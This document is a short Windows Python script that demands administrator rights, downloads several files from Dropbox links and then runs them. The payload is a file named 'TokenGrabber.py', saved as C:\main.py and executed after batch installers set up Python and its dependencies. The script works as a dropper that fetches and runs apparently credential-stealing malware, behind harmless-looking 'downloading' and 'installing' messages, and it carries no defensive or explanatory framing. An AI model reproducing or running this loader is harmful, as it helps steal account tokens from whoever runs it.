import urllib.request
import os
import time
import random
import ctypes

def is_running_as_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def execute():
    if not is_running_as_admin():
        input('[!] The script is NOT running with administrative privileges.\nPlease run the script as admin.\nPress enter to exit.')
        exit()
    else:
        print('[+] The script is running with administrative privileges, you are good to go!')

if __name__ == '__main__':
    execute()

print("Downloading files now...")

url1 = 'https://www.dropbox.com/s/1bqrnvz3xhlubtr/TokenGrabber.py?dl=1'
urllib.request.urlretrieve(url1, r'C:\main.py')
print("Main script downloaded...")

url2 = 'https://www.dropbox.com/s/takzvrxsyiagt2f/RequirementInstaller.bat?dl=1'
urllib.request.urlretrieve(url2, r'C:\dependencyInstaller.bat')
print("Dependency installer downloaded...")

url3 = 'https://www.dropbox.com/s/yyi2d2f08nqq5z3/PythonInstaller.bat?dl=1'
urllib.request.urlretrieve(url3, r'C:\pythonInstaller.bat')
print("Python installation automator downloaded...")

url4 = 'https://www.dropbox.com/s/p5c7ldofsm5lb5o/python-3.9.0.exe?dl=1'
urllib.request.urlretrieve(url4, r'C:\python-3.9.0.exe')
print("Python setup downloaded.. Running installers...")

time.sleep(3)
os.system('C:\pythonInstaller.bat')
print("Python installer ran...")
time.sleep(6)
print("Waiting 1")
time.sleep(6)
print("Waiting 2")
time.sleep(6)
print("Waiting 3")
time.sleep(6)
print("Waiting 4")
time.sleep(6)
print("Installing requirements...")
os.system('C:\dependencyInstaller')
time.sleep(10)
os.system('C:\dependencyInstaller')
os.system('python C:\main.py')
print("Main script ran")
